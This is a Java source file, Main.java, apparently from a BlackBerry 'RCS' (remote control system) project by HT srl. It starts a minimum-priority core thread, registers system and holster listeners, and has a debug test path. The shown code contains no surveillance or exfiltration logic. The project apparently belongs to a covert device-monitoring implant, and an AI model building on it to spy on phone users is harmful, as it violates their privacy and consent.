/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.device.api.system.Application;
import tests.MainTest;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Main.
 * Antenna defines: DBC,HAVE_PERMISSIONS,HAVE_MIME,EVENTLOGGER
 */
public class Main extends Application {

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#mdebug
        if (args.length > 0) {
            System.out.println("Test");
            new MainTest();
        } else {
            //#enddebug

            new Main().enterEventDispatcher();

            //#mdebug 
        }
        //#enddebug
    }

    private final Debug debug;

    AppListener appListener = AppListener.getInstance();

    /**
     * Instantiates a new main.
     */
    public Main() {
        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);

        final Core core = Core.getInstance();

        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.getString());

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();
    }

    /**
     * 
     */
    public void startListeners() {
        //#debug info
        debug.info("Starting Listeners");
        
      
        addHolsterListener(appListener);
        addSystemListener(appListener);
    }
    
    /**
     * 
     */
    public void stopListeners() {
      //#debug info
        debug.info("Stopping Listeners");
        
        removeHolsterListener(appListener);
        removeSystemListener(appListener);
    }
}
